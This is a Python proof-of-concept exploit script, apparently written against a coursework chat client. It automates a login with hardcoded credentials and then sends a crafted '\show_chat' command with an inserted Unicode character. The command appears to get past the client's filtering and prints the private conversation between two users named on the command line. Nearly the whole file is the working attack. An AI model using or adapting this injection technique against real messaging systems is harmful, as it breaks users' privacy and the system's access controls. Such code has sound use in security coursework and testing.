import pexpect
import argparse
import sys
import re
import os


def main(user1, user2):
    
    try:
        program = pexpect.spawn("python3", ["client.py"], echo=False, timeout=10, encoding="utf-8")
    except Exception as e:
        print(f"Couldn't start client.py: {e}")
        return
        
    #program.logfile = sys.stdout
    try:
        # Login as Bob
        program.expect("To exit type:")
        program.sendline("login")
        
        # Send username
        program.expect("Enter Username:")
        program.sendline("Bob")
        
        # Send password
        program.expect("Enter Password:")
        program.sendline("IamBob")
        
        # Begin talking to self to preform the attack
        program.expect("Please type")
        program.sendline("Bob")
        
        # Send command exploit
        program.expect("Press enter to send")
        program.sendline(f"\\show_chat愛({user1}, {user2})")
        
        # Await first message
        program.expect("Bob:")
        
        program.before.strip()
        

        # Now capture only the actual chat messages
        chat_lines = []

        while True:
            try:
                line = program.readline().strip()
                # Add any line that is a message
                if ":" in line:               
                    chat_lines.append(line)
            except pexpect.TIMEOUT:
                break

        chat_output = "\n".join(chat_lines)
        print(f"\nChat output:\n{chat_output}")
        
        program.sendline("\\exit")
        program.close()
                
    except pexpect.TIMEOUT:
        print("Timed out waiting for login prompt.")
    except pexpect.EOF:
        print("Program exited unexpectedly.")


if __name__ == "__main__":
    try:
        main(sys.argv[1], sys.argv[2])
    except Exception as e:
        print(f"Exploit failed. {e}")
